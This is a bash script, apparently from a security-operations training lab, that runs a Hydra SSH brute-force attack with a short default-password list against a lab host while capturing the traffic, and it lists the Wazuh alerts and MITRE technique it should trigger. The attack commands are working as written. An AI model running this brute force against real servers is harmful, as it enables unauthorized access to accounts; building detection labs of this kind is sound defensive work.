#!/bin/bash
# ============================================================
#  attack_03_brute_force.sh
#  SSH Brute Force with Hydra + Wireshark Capture
#  Run from Kali Linux
# ============================================================

TARGET_HOST="192.168.100.10"
TARGET_USER="ubuntu"
OUTPUT_DIR="/root/soc-lab-attacks"
PCAP_FILE="$OUTPUT_DIR/brute_force_capture.pcap"

mkdir -p $OUTPUT_DIR

echo "[*] Starting Attack 3: SSH Brute Force"
echo "[*] Target: $TARGET_HOST"
echo "[*] Username: $TARGET_USER"
echo ""

# Create password list
echo "[+] Creating password wordlist..."
cat > $OUTPUT_DIR/passwords.txt <<EOF
password
ubuntu
admin
root
123456
toor
pass
user
test
kali
EOF
echo "    ✓ Created 10-word password list"
echo ""

# Start packet capture in background
echo "[+] Starting Wireshark packet capture..."
sudo tcpdump -i eth0 -w $PCAP_FILE "host $TARGET_HOST and port 22" &
TCPDUMP_PID=$!
echo "    ✓ Capture running (PID: $TCPDUMP_PID)"
sleep 2
echo ""

# Run Hydra brute force
echo "[+] Launching Hydra SSH brute force attack..."
echo "    This will generate multiple failed login attempts"
echo "    (Wazuh should detect this as Rule 5710)"
echo ""

hydra -l $TARGET_USER -P $OUTPUT_DIR/passwords.txt \
      ssh://$TARGET_HOST -t 4 -V -o $OUTPUT_DIR/hydra_results.txt

echo ""
echo "[+] Attack completed. Stopping packet capture..."
sleep 2
sudo kill $TCPDUMP_PID

echo ""
echo "[✓] Attack 3 Complete!"
echo ""
echo "Generated files:"
echo "  - $OUTPUT_DIR/passwords.txt"
echo "  - $OUTPUT_DIR/hydra_results.txt"
echo "  - $PCAP_FILE"
echo ""
echo "Check Wazuh Dashboard for:"
echo "  - Rule 5710 (Authentication failure)"
echo "  - Multiple failed SSH attempts"
echo "  - MITRE ATT&CK: T1110.001 (Brute Force - Password Guessing)"
echo ""
echo "Analyze capture:"
echo "  sudo wireshark $PCAP_FILE"
echo ""
echo "Next: Document in attack-scenarios/03_brute_force.md"
